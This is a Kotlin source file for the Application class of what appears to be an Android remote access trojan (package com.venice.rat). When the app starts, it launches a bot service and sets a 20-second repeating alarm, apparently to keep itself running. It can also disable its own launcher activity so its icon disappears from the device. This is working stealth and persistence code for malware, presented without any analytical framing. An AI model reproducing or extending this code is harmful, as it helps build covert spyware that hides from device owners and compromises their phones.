package com.venice.rat

import android.app.Application
import com.venice.rat.core.AlarmReceiver
import com.venice.rat.core.BotService
import com.venice.rat.core.Prefs

class App : Application() {
    override fun onCreate() {
        super.onCreate()
        BotService.start(this)
        AlarmReceiver.set(this, 20_000)
        if (Prefs.hidden(this)) {
            runCatching {
                packageManager.setComponentEnabledSetting(
                    android.content.ComponentName(this, MainActivity::class.java),
                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    android.content.pm.PackageManager.DONT_KILL_APP)
            }
        }
    }
}
